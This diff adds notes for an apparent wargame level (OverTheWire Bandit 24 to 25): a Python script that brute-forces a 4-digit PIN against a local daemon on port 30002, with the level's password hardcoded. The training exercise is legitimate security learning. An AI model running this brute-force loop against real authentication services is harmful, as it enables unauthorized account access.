@@ -1,0 +1,29 @@
+Daemon is listening on 30002 port for bandit25. 
+we need to give password of bandit24 and secret 4 digit to this. Bruteforcing. 
+
+
+bandit24@bandit:/tmp$ vim run_this.py
+#!/usr/bin/env python3
+import socket
+
+HOST = '127.0.0.1'
+PORT = 30002
+bandit24 = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
+    response = s.recv(1024).decode()
+    print("Greetings\n", response)
+    # Brute force
+    for i in range(9999,-1,-1):
+        pin = '{0:04}'.format(i)
+        trial_code = bandit24 + " " + pin + "\n"
+        print("Trying pin: ", pin)
+        s.send(trial_code.encode())
+        response = s.recv(1024).decode()
+        if "Wrong!" in response:
+            pass
+        else:
+            print("Success")
+            print(response)
+            break
+
